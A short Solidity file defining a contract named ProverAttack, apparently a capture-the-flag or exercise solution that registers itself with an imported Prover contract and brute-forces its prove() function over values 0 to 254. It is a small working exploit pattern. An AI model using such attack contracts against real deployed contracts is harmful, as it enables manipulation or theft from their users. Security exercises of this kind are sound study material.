// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "./Prover.sol";

contract ProverAttack {
    address prover;
    
    constructor(address _prover) {
        prover = _prover;
    }

    function submitSolver() external {
        Prover(prover).submitSolver(address(this));
    }

    function solve() external {
        for(uint8 i = 0; i < 0xff; i++) {
            Prover(prover).prove(uint256(i));
        }
    }
}